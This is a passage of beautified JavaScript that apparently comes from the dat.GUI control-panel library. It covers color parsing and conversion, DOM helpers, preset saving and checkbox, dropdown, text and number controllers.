        var t = e.toString();
        if (t.indexOf(".") > -1) {
            return t.length - t.indexOf(".") - 1;
        } else {
            return 0;
        }
    }
    function s(e, t) {
        var n = Math.pow(10, t);
        return Math.round(e * n) / n;
    }
    function a(e, t, n, o, i) {
        return o + (e - t) / (n - t) * (i - o);
    }
    function l(e, t, n, o) {
        e.style.background = "";
        S.each(ee, function(i) {
            e.style.cssText += "background: " + i + "linear-gradient(" + t + ", " + n + " 0%, " + o + " 100%); ";
        });
    }
    function d(e) {
        e.style.background = "";
        e.style.cssText += "background: -moz-linear-gradient(top,  #ff0000 0%, #ff00ff 17%, #0000ff 34%, #00ffff 50%, #00ff00 67%, #ffff00 84%, #ff0000 100%);";
        e.style.cssText += "background: -webkit-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);";
        e.style.cssText += "background: -o-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);";
        e.style.cssText += "background: -ms-linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);";
        e.style.cssText += "background: linear-gradient(top,  #ff0000 0%,#ff00ff 17%,#0000ff 34%,#00ffff 50%,#00ff00 67%,#ffff00 84%,#ff0000 100%);";
    }
    function c(e, t, n) {
        var o = document.createElement("li");
        if (t) {
            o.appendChild(t);
        }
        if (n) {
            e.__ul.insertBefore(o, n);
        } else {
            e.__ul.appendChild(o);
        }
        e.onResize();
        return o;
    }
    function u(e) {
        X.unbind(window, "resize", e.__resizeHandler);
        if (e.saveToLocalStorageIfPossible) {
            X.unbind(window, "unload", e.saveToLocalStorageIfPossible);
        }
    }
    function _(e, t) {
        var n = e.__preset_select[e.__preset_select.selectedIndex];
        n.innerHTML = t ? n.value + "*" : n.value;
    }
    function h(e, t, n) {
        n.__li = t;
        n.__gui = e;
        S.extend(n, {
            options: function(t) {
                if (arguments.length > 1) {
                    var o = n.__li.nextElementSibling;
                    n.remove();
                    return f(e, n.object, n.property, {
                        before: o,
                        factoryArgs: [S.toArray(arguments)]
                    });
                }
                if (S.isArray(t) || S.isObject(t)) {
                    var i = n.__li.nextElementSibling;
                    n.remove();
                    return f(e, n.object, n.property, {
                        before: i,
                        factoryArgs: [t]
                    });
                }
            },
            name: function(e) {
                n.__li.firstElementChild.firstElementChild.innerHTML = e;
                return n;
            },
            listen: function() {
                n.__gui.listen(n);
                return n;
            },
            remove: function() {
                n.__gui.remove(n);
                return n;
            }
        });
        if (n instanceof q) {
            var o = new Q(n.object,n.property,{
                min: n.__min,
                max: n.__max,
                step: n.__step
            });
            S.each(["updateDisplay", "onChange", "onFinishChange", "step", "min", "max"], function(e) {
                var t = n[e];
                var i = o[e];
                n[e] = o[e] = function() {
                    var e = Array.prototype.slice.call(arguments);
                    i.apply(o, e);
                    return t.apply(n, e);
                }
                ;
            });
            X.addClass(t, "has-slider");
            n.domElement.insertBefore(o.domElement, n.domElement.firstElementChild);
        } else if (n instanceof Q) {
            function i(t) {
                if (S.isNumber(n.__min) && S.isNumber(n.__max)) {
                    var o = n.__li.firstElementChild.firstElementChild.innerHTML;
                    var i = n.__gui.__listening.indexOf(n) > -1;
                    n.remove();
                    var r = f(e, n.object, n.property, {
                        before: n.__li.nextElementSibling,
                        factoryArgs: [n.__min, n.__max, n.__step]
                    });
                    r.name(o);
                    if (i) {
                        r.listen();
                    }
                    return r;
                }
                return t;
            }
            n.min = S.compose(i, n.min);
            n.max = S.compose(i, n.max);
        } else if (n instanceof K) {
            X.bind(t, "click", function() {
                X.fakeEvent(n.__checkbox, "click");
            });
            X.bind(n.__checkbox, "click", function(e) {
                e.stopPropagation();
            });
        } else if (n instanceof Z) {
            X.bind(t, "click", function() {
                X.fakeEvent(n.__button, "click");
            });
            X.bind(t, "mouseover", function() {
                X.addClass(n.__button, "hover");
            });
            X.bind(t, "mouseout", function() {
                X.removeClass(n.__button, "hover");
            });
        } else if (n instanceof $) {
            X.addClass(t, "color");
            n.updateDisplay = S.compose(function(e) {
                t.style.borderLeftColor = n.__color.toString();
                return e;
            }, n.updateDisplay);
            n.updateDisplay();
        }
        n.setValue = S.compose(function(t) {
            if (e.getRoot().__preset_select && n.isModified()) {
                _(e.getRoot(), true);
            }
            return t;
        }, n.setValue);
    }
    function p(e, t) {
        var n = e.getRoot();
        var o = n.__rememberedObjects.indexOf(t.object);
        if (o !== -1) {
            var i = n.__rememberedObjectIndecesToControllers[o];
            if (i === undefined) {
                i = {};
                n.__rememberedObjectIndecesToControllers[o] = i;
            }
            i[t.property] = t;
            if (n.load && n.load.remembered) {
                var r = n.load.remembered;
                var s = undefined;
                if (r[e.preset]) {
                    s = r[e.preset];
                } else {
                    if (!r[se]) {
                        return;
                    }
                    s = r[se];
                }
                if (s[o] && s[o][t.property] !== undefined) {
                    var a = s[o][t.property];
                    t.initialValue = a;
                    t.setValue(a);
                }
            }
        }
    }
    function f(e, t, n, o) {
        if (t[n] === undefined) {
            throw new Error("Object \"" + t + "\" has no property \"" + n + "\"");
        }
        var i = undefined;
        if (o.color) {
            i = new $(t,n);
        } else {
            var r = [t, n].concat(o.factoryArgs);
            i = ne.apply(e, r);
        }
        if (o.before instanceof z) {
            o.before = o.before.__li;
        }
        p(e, i);
        X.addClass(i.domElement, "c");
        var s = document.createElement("span");
        X.addClass(s, "property-name");
        s.innerHTML = i.property;
        var a = document.createElement("div");
        a.appendChild(s);
        a.appendChild(i.domElement);
        var l = c(e, a, o.before);
        X.addClass(l, he.CLASS_CONTROLLER_ROW);
        if (i instanceof $) {
            X.addClass(l, "color");
        } else {
            X.addClass(l, H(i.getValue()));
        }
        h(e, l, i);
        e.__controllers.push(i);
        return i;
    }
    function m(e, t) {
        return document.location.href + "." + t;
    }
    function g(e, t, n) {
        var o = document.createElement("option");
        o.innerHTML = t;
        o.value = t;
        e.__preset_select.appendChild(o);
        if (n) {
            e.__preset_select.selectedIndex = e.__preset_select.length - 1;
        }
    }
    function b(e, t) {
        t.style.display = e.useLocalStorage ? "block" : "none";
    }
    function v(e) {
        var t = e.__save_row = document.createElement("li");
        X.addClass(e.domElement, "has-save");
        e.__ul.insertBefore(t, e.__ul.firstChild);
        X.addClass(t, "save-row");
        var n = document.createElement("span");
        n.innerHTML = "&nbsp;";
        X.addClass(n, "button gears");
        var o = document.createElement("span");
        o.innerHTML = "Save";
        X.addClass(o, "button");
        X.addClass(o, "save");
        var i = document.createElement("span");
        i.innerHTML = "New";
        X.addClass(i, "button");
        X.addClass(i, "save-as");
        var r = document.createElement("span");
        r.innerHTML = "Revert";
        X.addClass(r, "button");
        X.addClass(r, "revert");
        var s = e.__preset_select = document.createElement("select");
        if (e.load && e.load.remembered) {
            S.each(e.load.remembered, function(t, n) {
                g(e, n, n === e.preset);
            });
        } else {
            g(e, se, false);
        }
        X.bind(s, "change", function() {
            for (var t = 0; t < e.__preset_select.length; t++) {
                e.__preset_select[t].innerHTML = e.__preset_select[t].value;
            }
            e.preset = this.value;
        });
        t.appendChild(s);
        t.appendChild(n);
        t.appendChild(o);
        t.appendChild(i);
        t.appendChild(r);
        if (ae) {
            var a = document.getElementById("dg-local-explain");
            var l = document.getElementById("dg-local-storage");
            document.getElementById("dg-save-locally").style.display = "block";
            if (localStorage.getItem(m(e, "isLocal")) === "true") {
                l.setAttribute("checked", "checked");
            }
            b(e, a);
            X.bind(l, "change", function() {
                e.useLocalStorage = !e.useLocalStorage;
                b(e, a);
            });
        }
        var d = document.getElementById("dg-new-constructor");
        X.bind(d, "keydown", function(e) {
            if (!!e.metaKey && (e.which === 67 || e.keyCode === 67)) {
                le.hide();
            }
        });
        X.bind(n, "click", function() {
            d.innerHTML = JSON.stringify(e.getSaveObject(), undefined, 2);
            le.show();
            d.focus();
            d.select();
        });
        X.bind(o, "click", function() {
            e.save();
        });
        X.bind(i, "click", function() {
            var t = prompt("Enter a new preset name.");
            if (t) {
                e.saveAs(t);
            }
        });
        X.bind(r, "click", function() {
            e.revert();
        });
    }
    function y(e) {
        function t(t) {
            t.preventDefault();
            e.width += i - t.clientX;
            e.onResize();
            i = t.clientX;
            return false;
        }
        function n() {
            X.removeClass(e.__closeButton, he.CLASS_DRAG);
            X.unbind(window, "mousemove", t);
            X.unbind(window, "mouseup", n);
        }
        function o(o) {
            o.preventDefault();
            i = o.clientX;
            X.addClass(e.__closeButton, he.CLASS_DRAG);
            X.bind(window, "mousemove", t);
            X.bind(window, "mouseup", n);
            return false;
        }
        var i = undefined;
        e.__resize_handle = document.createElement("div");
        S.extend(e.__resize_handle.style, {
            width: "6px",
            marginLeft: "-3px",
            height: "200px",
            cursor: "ew-resize",
            position: "absolute"
        });
        X.bind(e.__resize_handle, "mousedown", o);
        X.bind(e.__closeButton, "mousedown", o);
        e.domElement.insertBefore(e.__resize_handle, e.domElement.firstElementChild);
    }
    function w(e, t) {
        e.domElement.style.width = t + "px";
        if (e.__save_row && e.autoPlace) {
            e.__save_row.style.width = t + "px";
        }
        if (e.__closeButton) {
            e.__closeButton.style.width = t + "px";
        }
    }
    function x(e, t) {
        var n = {};
        S.each(e.__rememberedObjects, function(o, i) {
            var r = {};
            var s = e.__rememberedObjectIndecesToControllers[i];
            S.each(s, function(e, n) {
                r[n] = t ? e.initialValue : e.getValue();
            });
            n[i] = r;
        });
        return n;
    }
    function E(e) {
        for (var t = 0; t < e.__preset_select.length; t++) {
            if (e.__preset_select[t].value === e.preset) {
                e.__preset_select.selectedIndex = t;
            }
        }
    }
    function C(e) {
        if (e.length !== 0) {
            oe.call(window, function() {
                C(e);
            });
        }
        S.each(e, function(e) {
            e.updateDisplay();
        });
    }
    var A = Array.prototype.forEach;
    var k = Array.prototype.slice;
    var S = {
        BREAK: {},
        extend: function(e) {
            this.each(k.call(arguments, 1), function(t) {
                (this.isObject(t) ? Object.keys(t) : []).forEach(function(n) {
                    if (!this.isUndefined(t[n])) {
                        e[n] = t[n];
                    }
                }
                .bind(this));
            }, this);
            return e;
        },
        defaults: function(e) {
            this.each(k.call(arguments, 1), function(t) {
                (this.isObject(t) ? Object.keys(t) : []).forEach(function(n) {
                    if (this.isUndefined(e[n])) {
                        e[n] = t[n];
                    }
                }
                .bind(this));
            }, this);
            return e;
        },
        compose: function() {
            var e = k.call(arguments);
            return function() {
                var t = k.call(arguments);
                for (var n = e.length - 1; n >= 0; n--) {
                    t = [e[n].apply(this, t)];
                }
                return t[0];
            }
            ;
        },
        each: function(e, t, n) {
            if (e) {
                if (A && e.forEach && e.forEach === A) {
                    e.forEach(t, n);
                } else if (e.length === e.length + 0) {
                    var o = undefined;
                    var i = undefined;
                    o = 0;
                    i = e.length;
                    for (; o < i; o++) {
                        if (o in e && t.call(n, e[o], o) === this.BREAK) {
                            return;
                        }
                    }
                } else {
                    for (var r in e) {
                        if (t.call(n, e[r], r) === this.BREAK) {
                            return;
                        }
                    }
                }
            }
        },
        defer: function(e) {
            setTimeout(e, 0);
        },
        debounce: function(e, t, n) {
            var o = undefined;
            return function() {
                var i = this;
                var r = arguments;
                var s = n || !o;
                clearTimeout(o);
                o = setTimeout(function() {
                    o = null;
                    if (!n) {
                        e.apply(i, r);
                    }
                }, t);
                if (s) {
                    e.apply(i, r);
                }
            }
            ;
        },
        toArray: function(e) {
            if (e.toArray) {
                return e.toArray();
            } else {
                return k.call(e);
            }
        },
        isUndefined: function(e) {
            return e === undefined;
        },
        isNull: function(e) {
            return e === null;
        },
        isNaN: function(e) {
            function t(t) {
                return e.apply(this, arguments);
            }
            t.toString = function() {
                return e.toString();
            }
            ;
            return t;
        }(function(e) {
            return isNaN(e);
        }),
        isArray: Array.isArray || function(e) {
            return e.constructor === Array;
        }
        ,
        isObject: function(e) {
            return e === Object(e);
        },
        isNumber: function(e) {
            return e === e + 0;
        },
        isString: function(e) {
            return e === e + "";
        },
        isBoolean: function(e) {
            return e === false || e === true;
        },
        isFunction: function(e) {
            return e instanceof Function;
        }
    };
    var O = [{
        litmus: S.isString,
        conversions: {
            THREE_CHAR_HEX: {
                read: function(e) {
                    var t = e.match(/^#([A-F0-9])([A-F0-9])([A-F0-9])$/i);
                    return t !== null && {
                        space: "HEX",
                        hex: parseInt("0x" + t[1].toString() + t[1].toString() + t[2].toString() + t[2].toString() + t[3].toString() + t[3].toString(), 0)
                    };
                },
                write: t
            },
            SIX_CHAR_HEX: {
                read: function(e) {
                    var t = e.match(/^#([A-F0-9]{6})$/i);
                    return t !== null && {
                        space: "HEX",
                        hex: parseInt("0x" + t[1].toString(), 0)
                    };
                },
                write: t
            },
            CSS_RGB: {
                read: function(e) {
                    var t = e.match(/^rgb\(\s*(\S+)\s*,\s*(\S+)\s*,\s*(\S+)\s*\)/);
                    return t !== null && {
                        space: "RGB",
                        r: parseFloat(t[1]),
                        g: parseFloat(t[2]),
                        b: parseFloat(t[3])
                    };
                },
                write: t
            },
            CSS_RGBA: {
                read: function(e) {
                    var t = e.match(/^rgba\(\s*(\S+)\s*,\s*(\S+)\s*,\s*(\S+)\s*,\s*(\S+)\s*\)/);
                    return t !== null && {
                        space: "RGB",
                        r: parseFloat(t[1]),
                        g: parseFloat(t[2]),
                        b: parseFloat(t[3]),
                        a: parseFloat(t[4])
                    };
                },
                write: t
            }
        }
    }, {
        litmus: S.isNumber,
        conversions: {
            HEX: {
                read: function(e) {
                    return {
                        space: "HEX",
                        hex: e,
                        conversionName: "HEX"
                    };
                },
                write: function(e) {
                    return e.hex;
                }
            }
        }
    }, {
        litmus: S.isArray,
        conversions: {
            RGB_ARRAY: {
                read: function(e) {
                    return e.length === 3 && {
                        space: "RGB",
                        r: e[0],
                        g: e[1],
                        b: e[2]
                    };
                },
                write: function(e) {
                    return [e.r, e.g, e.b];
                }
            },
            RGBA_ARRAY: {
                read: function(e) {
                    return e.length === 4 && {
                        space: "RGB",
                        r: e[0],
                        g: e[1],
                        b: e[2],
                        a: e[3]
                    };
                },
                write: function(e) {
                    return [e.r, e.g, e.b, e.a];
                }
            }
        }
    }, {
        litmus: S.isObject,
        conversions: {
            RGBA_OBJ: {
                read: function(e) {
                    return !!S.isNumber(e.r) && !!S.isNumber(e.g) && !!S.isNumber(e.b) && !!S.isNumber(e.a) && {
                        space: "RGB",
                        r: e.r,
                        g: e.g,
                        b: e.b,
                        a: e.a
                    };
                },
                write: function(e) {
                    return {
                        r: e.r,
                        g: e.g,
                        b: e.b,
                        a: e.a
                    };
                }
            },
            RGB_OBJ: {
                read: function(e) {
                    return !!S.isNumber(e.r) && !!S.isNumber(e.g) && !!S.isNumber(e.b) && {
                        space: "RGB",
                        r: e.r,
                        g: e.g,
                        b: e.b
                    };
                },
                write: function(e) {
                    return {
                        r: e.r,
                        g: e.g,
                        b: e.b
                    };
                }
            },
            HSVA_OBJ: {
                read: function(e) {
                    return !!S.isNumber(e.h) && !!S.isNumber(e.s) && !!S.isNumber(e.v) && !!S.isNumber(e.a) && {
                        space: "HSV",
                        h: e.h,
                        s: e.s,
                        v: e.v,
                        a: e.a
                    };
                },
                write: function(e) {
                    return {
                        h: e.h,
                        s: e.s,
                        v: e.v,
                        a: e.a
                    };
                }
            },
            HSV_OBJ: {
                read: function(e) {
                    return !!S.isNumber(e.h) && !!S.isNumber(e.s) && !!S.isNumber(e.v) && {
                        space: "HSV",
                        h: e.h,
                        s: e.s,
                        v: e.v
                    };
                },
                write: function(e) {
                    return {
                        h: e.h,
                        s: e.s,
                        v: e.v
                    };
                }
            }
        }
    }];
    var T = undefined;
    var L = undefined;
    function R() {
        L = false;
        var e = arguments.length > 1 ? S.toArray(arguments) : arguments[0];
        S.each(O, function(t) {
            if (t.litmus(e)) {
                S.each(t.conversions, function(t, n) {
                    T = t.read(e);
                    if (L === false && T !== false) {
                        L = T;
                        T.conversionName = n;
                        T.conversion = t;
                        return S.BREAK;
                    }
                });
                return S.BREAK;
            }
        });
        return L;
    }
    var B = undefined;
    var N = {
        hsv_to_rgb: function(e, t, n) {
            var o = Math.floor(e / 60) % 6;
            var i = e / 60 - Math.floor(e / 60);
            var r = n * (1 - t);
            var s = n * (1 - i * t);
            var a = n * (1 - (1 - i) * t);
            var l = [[n, a, r], [s, n, r], [r, n, a], [r, s, n], [a, r, n], [n, r, s]][o];
            return {
                r: l[0] * 255,
                g: l[1] * 255,
                b: l[2] * 255
            };
        },
        rgb_to_hsv: function(e, t, n) {
            var o = Math.min(e, t, n);
            var i = Math.max(e, t, n);
            var r = i - o;
            var s = undefined;
            var a = undefined;
            if (i === 0) {
                return {
                    h: NaN,
                    s: 0,
                    v: 0
                };
            } else {
                a = r / i;
                s = e === i ? (t - n) / r : t === i ? 2 + (n - e) / r : 4 + (e - t) / r;
                if ((s /= 6) < 0) {
                    s += 1;
                }
                return {
                    h: s * 360,
                    s: a,
                    v: i / 255
                };
            }
        },
        rgb_to_hex: function(e, t, n) {
            var o = this.hex_with_component(0, 2, e);
            o = this.hex_with_component(o, 1, t);
            return o = this.hex_with_component(o, 0, n);
        },
        component_from_hex: function(e, t) {
            return e >> t * 8 & 255;
        },
        hex_with_component: function(e, t, n) {
            return n << (B = t * 8) | e & ~(255 << B);
        }
    };
    var H = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function(e) {
        return typeof e;
    }
    : function(e) {
        if (e && typeof Symbol == "function" && e.constructor === Symbol && e !== Symbol.prototype) {
            return "symbol";
        } else {
            return typeof e;
        }
    }
    ;
    function F(e, t) {
        if (!(e instanceof t)) {
            throw new TypeError("Cannot call a class as a function");
        }
    }
    var P = function() {
        function e(e, t) {
            for (var n = 0; n < t.length; n++) {
                var o = t[n];
                o.enumerable = o.enumerable || false;
                o.configurable = true;
                if ("value"in o) {
                    o.writable = true;
                }
                Object.defineProperty(e, o.key, o);
            }
        }
        return function(t, n, o) {
            if (n) {
                e(t.prototype, n);
            }
            if (o) {
                e(t, o);
            }
            return t;
        }
        ;
    }();
    var D = function e(t, n, o) {
        if (t === null) {
            t = Function.prototype;
        }
        var i = Object.getOwnPropertyDescriptor(t, n);
        if (i === undefined) {
            var r = Object.getPrototypeOf(t);
            if (r === null) {
                return undefined;
            } else {
                return e(r, n, o);
            }
        }
        if ("value"in i) {
            return i.value;
        }
        var s = i.get;
        if (s !== undefined) {
            return s.call(o);
        }
    };
    function j(e, t) {
        if (typeof t != "function" && t !== null) {
            throw new TypeError("Super expression must either be null or a function, not " + typeof t);
        }
        e.prototype = Object.create(t && t.prototype, {
            constructor: {
                value: e,
                enumerable: false,
                writable: true,
                configurable: true
            }
        });
        if (t) {
            if (Object.setPrototypeOf) {
                Object.setPrototypeOf(e, t);
            } else {
                e.__proto__ = t;
            }
        }
    }
    function V(e, t) {
        if (!e) {
            throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        }
        if (!t || typeof t != "object" && typeof t != "function") {
            return e;
        } else {
            return t;
        }
    }
    var I = function() {
        function e() {
            F(this, e);
            this.__state = R.apply(this, arguments);
            if (this.__state === false) {
                throw new Error("Failed to interpret color arguments");
            }
            this.__state.a = this.__state.a || 1;
        }
        P(e, [{
            key: "toString",
            value: function() {
                return t(this);
            }
        }, {
            key: "toHexString",
            value: function() {
                return t(this, true);
            }
        }, {
            key: "toOriginal",
            value: function() {
                return this.__state.conversion.write(this);
            }
        }]);
        return e;
    }();
    I.recalculateRGB = function(e, t, n) {
        if (e.__state.space === "HEX") {
            e.__state[t] = N.component_from_hex(e.__state.hex, n);
        } else {
            if (e.__state.space !== "HSV") {
                throw new Error("Corrupted color state");
            }
            S.extend(e.__state, N.hsv_to_rgb(e.__state.h, e.__state.s, e.__state.v));
        }
    }
    ;
    I.recalculateHSV = function(e) {
        var t = N.rgb_to_hsv(e.r, e.g, e.b);
        S.extend(e.__state, {
            s: t.s,
            v: t.v
        });
        if (S.isNaN(t.h)) {
            if (S.isUndefined(e.__state.h)) {
                e.__state.h = 0;
            }
        } else {
            e.__state.h = t.h;
        }
    }
    ;
    I.COMPONENTS = ["r", "g", "b", "h", "s", "v", "hex", "a"];
    n(I.prototype, "r", 2);
    n(I.prototype, "g", 1);
    n(I.prototype, "b", 0);
    o(I.prototype, "h");
    o(I.prototype, "s");
    o(I.prototype, "v");
    Object.defineProperty(I.prototype, "a", {
        get: function() {
            return this.__state.a;
        },
        set: function(e) {
            this.__state.a = e;
        }
    });
    Object.defineProperty(I.prototype, "hex", {
        get: function() {
            if (this.__state.space !== "HEX") {
                this.__state.hex = N.rgb_to_hex(this.r, this.g, this.b);
                this.__state.space = "HEX";
            }
            return this.__state.hex;
        },
        set: function(e) {
            this.__state.space = "HEX";
            this.__state.hex = e;
        }
    });
    var z = function() {
        function e(t, n) {
            F(this, e);
            this.initialValue = t[n];
            this.domElement = document.createElement("div");
            this.object = t;
            this.property = n;
            this.__onChange = undefined;
            this.__onFinishChange = undefined;
        }
        P(e, [{
            key: "onChange",
            value: function(e) {
                this.__onChange = e;
                return this;
            }
        }, {
            key: "onFinishChange",
            value: function(e) {
                this.__onFinishChange = e;
                return this;
            }
        }, {
            key: "setValue",
            value: function(e) {
                this.object[this.property] = e;
                if (this.__onChange) {
                    this.__onChange.call(this, e);
                }
                this.updateDisplay();
                return this;
            }
        }, {
            key: "getValue",
            value: function() {
                return this.object[this.property];
            }
        }, {
            key: "updateDisplay",
            value: function() {
                return this;
            }
        }, {
            key: "isModified",
            value: function() {
                return this.initialValue !== this.getValue();
            }
        }]);
        return e;
    }();
    var M = {
        HTMLEvents: ["change"],
        MouseEvents: ["click", "mousemove", "mousedown", "mouseup", "mouseover"],
        KeyboardEvents: ["keydown"]
    };
    var G = {};
    S.each(M, function(e, t) {
        S.each(e, function(e) {
            G[e] = t;
        });
    });
    var U = /(\d+(\.\d+)?)px/;
    var X = {
        makeSelectable: function(e, t) {
            if (e !== undefined && e.style !== undefined) {
                e.onselectstart = t ? function() {
                    return false;
                }
                : function() {}
                ;
                e.style.MozUserSelect = t ? "auto" : "none";
                e.style.KhtmlUserSelect = t ? "auto" : "none";
                e.unselectable = t ? "on" : "off";
            }
        },
        makeFullscreen: function(e, t, n) {
            var o = n;
            var i = t;
            if (S.isUndefined(i)) {
                i = true;
            }
            if (S.isUndefined(o)) {
                o = true;
            }
            e.style.position = "absolute";
            if (i) {
                e.style.left = 0;
                e.style.right = 0;
            }
            if (o) {
                e.style.top = 0;
                e.style.bottom = 0;
            }
        },
        fakeEvent: function(e, t, n, o) {
            var i = n || {};
            var r = G[t];
            if (!r) {
                throw new Error("Event type " + t + " not supported.");
            }
            var s = document.createEvent(r);
            switch (r) {
            case "MouseEvents":
                var a = i.x || i.clientX || 0;
                var l = i.y || i.clientY || 0;
                s.initMouseEvent(t, i.bubbles || false, i.cancelable || true, window, i.clickCount || 1, 0, 0, a, l, false, false, false, false, 0, null);
                break;
            case "KeyboardEvents":
                var d = s.initKeyboardEvent || s.initKeyEvent;
                S.defaults(i, {
                    cancelable: true,
                    ctrlKey: false,
                    altKey: false,
                    shiftKey: false,
                    metaKey: false,
                    keyCode: undefined,
                    charCode: undefined
                });
                d(t, i.bubbles || false, i.cancelable, window, i.ctrlKey, i.altKey, i.shiftKey, i.metaKey, i.keyCode, i.charCode);
                break;
            default:
                s.initEvent(t, i.bubbles || false, i.cancelable || true);
            }
            S.defaults(s, o);
            e.dispatchEvent(s);
        },
        bind: function(e, t, n, o) {
            var i = o || false;
            if (e.addEventListener) {
                e.addEventListener(t, n, i);
            } else if (e.attachEvent) {
                e.attachEvent("on" + t, n);
            }
            return X;
        },
        unbind: function(e, t, n, o) {
            var i = o || false;
            if (e.removeEventListener) {
                e.removeEventListener(t, n, i);
            } else if (e.detachEvent) {
                e.detachEvent("on" + t, n);
            }
            return X;
        },
        addClass: function(e, t) {
            if (e.className === undefined) {
                e.className = t;
            } else if (e.className !== t) {
                var n = e.className.split(/ +/);
                if (n.indexOf(t) === -1) {
                    n.push(t);
                    e.className = n.join(" ").replace(/^\s+/, "").replace(/\s+$/, "");
                }
            }
            return X;
        },
        removeClass: function(e, t) {
            if (t) {
                if (e.className === t) {
                    e.removeAttribute("class");
                } else {
                    var n = e.className.split(/ +/);
                    var o = n.indexOf(t);
                    if (o !== -1) {
                        n.splice(o, 1);
                        e.className = n.join(" ");
                    }
                }
            } else {
                e.className = undefined;
            }
            return X;
        },
        hasClass: function(e, t) {
            return new RegExp("(?:^|\\s+)" + t + "(?:\\s+|$)").test(e.className) || false;
        },
        getWidth: function(e) {
            var t = getComputedStyle(e);
            return i(t["border-left-width"]) + i(t["border-right-width"]) + i(t["padding-left"]) + i(t["padding-right"]) + i(t.width);
        },
        getHeight: function(e) {
            var t = getComputedStyle(e);
            return i(t["border-top-width"]) + i(t["border-bottom-width"]) + i(t["padding-top"]) + i(t["padding-bottom"]) + i(t.height);
        },
        getOffset: function(e) {
            var t = e;
            var n = {
                left: 0,
                top: 0
            };
            if (t.offsetParent) {
                do {
                    n.left += t.offsetLeft;
                    n.top += t.offsetTop;
                    t = t.offsetParent;
                } while (t);
            }
            return n;
        },
        isActive: function(e) {
            return e === document.activeElement && (e.type || e.href);
        }
    };
    var K = function(e) {
        function t(e, n) {
            F(this, t);
            var o = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            var i = o;
            o.__prev = o.getValue();
            o.__checkbox = document.createElement("input");
            o.__checkbox.setAttribute("type", "checkbox");
            X.bind(o.__checkbox, "change", function() {
                i.setValue(!i.__prev);
            }, false);
            o.domElement.appendChild(o.__checkbox);
            o.updateDisplay();
            return o;
        }
        j(t, z);
        P(t, [{
            key: "setValue",
            value: function(e) {
                var n = D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "setValue", this).call(this, e);
                if (this.__onFinishChange) {
                    this.__onFinishChange.call(this, this.getValue());
                }
                this.__prev = this.getValue();
                return n;
            }
        }, {
            key: "updateDisplay",
            value: function() {
                if (this.getValue() === true) {
                    this.__checkbox.setAttribute("checked", "checked");
                    this.__checkbox.checked = true;
                    this.__prev = true;
                } else {
                    this.__checkbox.checked = false;
                    this.__prev = false;
                }
                return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "updateDisplay", this).call(this);
            }
        }]);
        return t;
    }();
    var Y = function(e) {
        function t(e, n, o) {
            F(this, t);
            var i = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            var r = o;
            var s = i;
            i.__select = document.createElement("select");
            if (S.isArray(r)) {
                var a = {};
                S.each(r, function(e) {
                    a[e] = e;
                });
                r = a;
            }
            S.each(r, function(e, t) {
                var n = document.createElement("option");
                n.innerHTML = t;
                n.setAttribute("value", e);
                s.__select.appendChild(n);
            });
            i.updateDisplay();
            X.bind(i.__select, "change", function() {
                var e = this.options[this.selectedIndex].value;
                s.setValue(e);
            });
            i.domElement.appendChild(i.__select);
            return i;
        }
        j(t, z);
        P(t, [{
            key: "setValue",
            value: function(e) {
                var n = D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "setValue", this).call(this, e);
                if (this.__onFinishChange) {
                    this.__onFinishChange.call(this, this.getValue());
                }
                return n;
            }
        }, {
            key: "updateDisplay",
            value: function() {
                if (X.isActive(this.__select)) {
                    return this;
                } else {
                    this.__select.value = this.getValue();
                    return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "updateDisplay", this).call(this);
                }
            }
        }]);
        return t;
    }();
    var J = function(e) {
        function t(e, n) {
            function o() {
                r.setValue(r.__input.value);
            }
            F(this, t);
            var i = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            var r = i;
            i.__input = document.createElement("input");
            i.__input.setAttribute("type", "text");
            X.bind(i.__input, "keyup", o);
            X.bind(i.__input, "change", o);
            X.bind(i.__input, "blur", function() {
                if (r.__onFinishChange) {
                    r.__onFinishChange.call(r, r.getValue());
                }
            });
            X.bind(i.__input, "keydown", function(e) {
                if (e.keyCode === 13) {
                    this.blur();
                }
            });
            i.updateDisplay();
            i.domElement.appendChild(i.__input);
            return i;
        }
        j(t, z);
        P(t, [{
            key: "updateDisplay",
            value: function() {
                if (!X.isActive(this.__input)) {
                    this.__input.value = this.getValue();
                }
                return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "updateDisplay", this).call(this);
            }
        }]);
        return t;
    }();
    var W = function(e) {
        function t(e, n, o) {
            F(this, t);
            var i = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            var s = o || {};
            i.__min = s.min;
            i.__max = s.max;
            i.__step = s.step;
            if (S.isUndefined(i.__step)) {
                if (i.initialValue === 0) {
                    i.__impliedStep = 1;
                } else {
                    i.__impliedStep = Math.pow(10, Math.floor(Math.log(Math.abs(i.initialValue)) / Math.LN10)) / 10;
                }
            } else {
                i.__impliedStep = i.__step;
            }
            i.__precision = r(i.__impliedStep);
            return i;
        }
        j(t, z);
        P(t, [{
            key: "setValue",
            value: function(e) {
                var n = e;
                if (this.__min !== undefined && n < this.__min) {
                    n = this.__min;
                } else if (this.__max !== undefined && n > this.__max) {
                    n = this.__max;
                }
                if (this.__step !== undefined && n % this.__step != 0) {
                    n = Math.round(n / this.__step) * this.__step;
                }
                return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "setValue", this).call(this, n);
            }
        }, {
            key: "min",
            value: function(e) {
                this.__min = e;
                return this;
            }
        }, {
            key: "max",
            value: function(e) {
                this.__max = e;
                return this;
            }
        }, {
            key: "step",
            value: function(e) {
                this.__step = e;
                this.__impliedStep = e;
                this.__precision = r(e);
                return this;
            }
        }]);
        return t;
    }();
    var Q = function(e) {
        function t(e, n, o) {
            function i() {
                if (l.__onFinishChange) {
